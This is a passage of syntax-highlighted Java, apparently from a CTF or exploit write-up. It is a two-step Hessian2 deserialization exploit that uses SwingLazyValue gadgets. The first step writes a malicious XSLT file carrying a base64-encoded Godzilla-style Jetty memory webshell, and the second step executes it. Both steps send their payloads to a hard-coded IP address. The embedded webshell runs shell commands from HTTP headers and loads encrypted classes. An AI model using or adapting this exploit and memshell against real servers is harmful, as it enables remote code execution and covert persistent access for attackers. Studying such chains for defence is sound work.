class="string">&quot;&lt;/xsl:stylesheet&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Code</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQCAAgA+QoA+gD7CgA4APwKADgA/QoA+gD+BwD/CgD6AQAKAAYBAQoABgECCgA4AQMHAQQKAIgBBQgBBgkAgAEHCAEICQCAAQkHAQoKABEBBQoAEQELCgARAQwKAIABDQkAgAEOCQEPARAKAREBEggBEwoANQEUCAEVCgA1ARYKARcBGAoBFwEZBwEaCgCAARsKARwBHQoBHAEeCgA3AR8IALQKAB8BIAoAHwEhBwC1CAEiCACuBwCvCACpCgA1ASMIASQKADgBJQcBJggBJwgBKAoANQEpCgEqASsIASwHAS0HAMEHAS4HAS8IATAKADUBMQgBMggBMwgBNAgBNQgBNggBNwoBOAE5BwE6CgBCATsKATgBPAoBOAE9CAE+CwE/AUAIANMKADgBQQoAOAFCCAFDCgEPAUQKADgBRQgBRgoAOAFHCAFICAFJCAFKCgFLAUwHAU0KAU4BTwoBTgFQCgFRAVIKAFQBUwgBVAoAVAFVCgBUAVYLAVcBWAoBWQFaCgFZAVsIAVwLAT8BXQoAgAFeCgCAAV8JAIABYAcBYQcBYgoBHAFjCgBkAWQHAWUIAWYJAWcBaAoANQFpCgEqARgKAWcBagcBawoAbgEFCgA3ASUKADgBbAoANwEMCgBuAW0KAIABbgoAOAFvCgCAAXAKAC8BcQoBcgFzCgF0AXUHAXYIAXcKAXgBeQoBFwF6CgB6AXsHAXwHAX0KAIABfgoAegF/BwGABwGBCgCEAYIHAYMHAYQHAYUBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQANU3RhY2tNYXBUYWJsZQcBLwcBBAEABjxpbml0PgEAAygpVgEABHRoaXMBACRMY29tL0VycjByMjMzL0pldHR5R29kemlsbGFNZW1zaGVsbDsBAAQoSSlWAQABSQEACWdldFVuc2FmZQEAEygpTHN1bi9taXNjL1Vuc2FmZTsBAAZ1bnNhZmUBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAJdGhldW5zYWZlAQARTHN1bi9taXNjL1Vuc2FmZTsBAApFeGNlcHRpb25zAQANZ2V0VmFsdWVGaWVsZAEAKygpTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IdHRwQ29ubmVjdGlvbjsBAAV2YWx1ZQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWoBAA10aHJlYWRMb2NhbHNGAQALdGhyZWFkbG9jYWwBAAV0YWJsZQEAGltMamF2YS9sYW5nL3JlZi9SZWZlcmVuY2U7AQABaQEAC3RocmVhZEdyb3VwAQAXTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAx0aHJlYWRzZmlsZWQBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcBGgcBhgcBhwcBLgEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAmJzAQACW0IBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAAVoHAX0HAYgBAAZoYW5kbGUBAIYoTGphdmEvbGFuZy9TdHJpbmc7TG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9SZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQAMb3V0cHV0U3RyZWFtAQAjTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBAANjbWQBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAlkZWZNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAEZGF0YQEABGJhc2UBACJMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL1JlcXVlc3Q7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwcAzwcBiQcBigEACDxjbGluaXQ+AQAKdmFsdWVGaWVsZAEAKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENvbm5lY3Rpb247AQAHaGFuZGxlcgEANExvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvaGFuZGxlci9IYW5kbGVyQ29sbGVjdGlvbjsBABJtdXRhYmxlV2hlblJ1bm5pbmcBAAhoYW5kbGVycwEAI1tMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0hhbmRsZXI7AQALbmV3SGFuZGxlcnMBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247BwEmBwF2BwDsBwGABwGDBwGEAQAKU291cmNlRmlsZQEAGkpldHR5R29kemlsbGFNZW1zaGVsbC5qYXZhAQADTUQ1BwGLDAGMAY0MAY4BjwwBkAGRDAGSAZMBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBlAGPDACaAZUMAZYBlwwBmAGZAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAmgCbAQAQM2M2ZTBiOGE5YzE1MjI0YQwAiQCKAQAIdXNlcm5hbWUMAIsAigEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAGaAZsMAZYBmQwAjACPDACMAIoHAZwMAZ0BngcBnwwBoACeAQAPc3VuLm1pc2MuVW5zYWZlDAGhAaIBAAl0aGVVbnNhZmUMAaMBpAcBhwwBpQGmDAGnAagBAA9zdW4vbWlzYy9VbnNhZmUMAKAAoQcBqQwBqgGrDAGsAa0MAa4BrwwBsAGxDAGyAbMBAAx0aHJlYWRMb2NhbHMMAbQBmQEAJ29yZy5lY2xpcHNlLmpldHR5LnNlcnZlci5IdHRwQ29ubmVjdGlvbgwBtQG2AQAnb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDb25uZWN0aW9uAQAQamF2YS51dGlsLkJhc2U2NAEACmdldEVuY29kZXIMAbcBuAcBuQwBugG7AQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAbwBvQEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQADQUVTBwGIDAGMAb4BAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDACaAb8MAcABwQwBwgHDAQALeC1mdWNrLWRhdGEHAcQMAcUAjwwBxgHHDAHIAckBAAdvcy5uYW1lDAHKAI8MAcsBmQEAA3dpbgwBzAHNAQACL2MBAAkvYmluL2Jhc2gBAAItYwcBzgwBzwGmAQARamF2YS91dGlsL1NjYW5uZXIHAdAMAdEB0gwB0wHUBwHVDAHWAdcMAJoB2AEAEFxBU0FEU0FEQVNEU0FEQVMMAdkB2gwB2wGZBwHcDAHdAd4HAd8MAeAB4QwB4gCbAQAIZ29kemlsbGEMAeMAjwwAwgDDDADFAMYMAI0AjgEAF2phdmEvbmV0L1VSTENsYXNzTG9hZGVyAQAMamF2YS9uZXQvVVJMDAHkAeUMAJoB5gEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzBwHnDAHoAI4MAekBuAwB6gHrAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAewB7QwB7gGPDAC6ALsMAewBlwwApwCoDAHvAfAHAfEMAfIB8wcB9AwB9QH2AQAyb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL2hhbmRsZXIvSGFuZGxlckNvbGxlY3Rpb24BABNfbXV0YWJsZVdoZW5SdW5uaW5nBwH3DAHqAfgMAfkB+gwB+wH8AQAgb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0hhbmRsZXIBACJjb20vRXJyMHIyMzMvSmV0dHlHb2R6aWxsYU1lbXNoZWxsDACaAJ4MAf0B/gEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDACaAf8BACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQAwb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAC2dldEluc3RhbmNlAQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEACGdldEJ5dGVzAQAEKClbQgEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBAAh0b1N0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEW9iamVjdEZpZWxkT2Zmc2V0AQAcKExqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDspSgEACWdldE9iamVjdAEAJyhMamF2YS9sYW5nL09iamVjdDtKKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEACWdldEhlYWRlcgEAEGVxdWFsc0lnbm9yZUNhc2UBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdpc0VtcHR5AQADKClaAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAgb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL1JlcXVlc3QBAApzZXRIYW5kbGVkAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAhamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtAQAFd3JpdGUBAAUoW0IpVgEABWZsdXNoAQAMZ2V0UGFyYW1ldGVyAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b0J5dGVBcnJheQEADmdldEh0dHBDaGFubmVsAQAoKClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDaGFubmVsOwEAJG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IdHRwQ2hhbm5lbAEACWdldFNlcnZlcgEAIygpTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9TZXJ2ZXI7AQAfb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL1NlcnZlcgEACmdldEhhbmRsZXIBACQoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSGFuZGxlcjsBABFqYXZhL2xhbmcvQm9vbGVh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&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xslt</span> <span class="operator">=</span> xsltTemplate.replace(<span class="string">&quot;base64&quot;</span>, base64Code);</span><br><span class="line">        xslt = xslt.replace(<span class="string">&quot;classname&quot;</span>, <span class="string">&quot;com.Err0r233.JettyGodzillaMemshell&quot;</span>);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="string">&quot;writeBytesToFilename&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/tmp/1.xslt&quot;</span>,xslt.getBytes()&#125;);</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;aaa&quot;</span>, swingLazyValue);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">mimeTypeParameterList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        SetValue(mimeTypeParameterList, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">        <span class="type">byte</span>[] data = ser(mimeTypeParameterList);</span><br><span class="line">        System.out.println(sendPostRequest(<span class="string">&quot;http://48.218.22.35:21000/run&quot;</span>, data));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">step2</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">swingLazyValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;-XT&quot;</span>, <span class="string">&quot;-XSL&quot;</span>, <span class="string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;);</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;aaa&quot;</span>, swingLazyValue);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">mimeTypeParameterList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        SetValue(mimeTypeParameterList, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">        <span class="type">byte</span>[] data = ser(mimeTypeParameterList);</span><br><span class="line">        System.out.println(sendPostRequest(<span class="string">&quot;http://48.218.22.35:21000/run&quot;</span>, data));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        step1();</span><br><span class="line">        step2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clz.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] ser(Object obj) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        <span class="comment">//允许反序列化NonSerializable</span></span><br><span class="line">        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发expect:</span></span><br><span class="line">        baos.write(<span class="number">67</span>);</span><br><span class="line">        hessian2Output.writeObject(obj);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 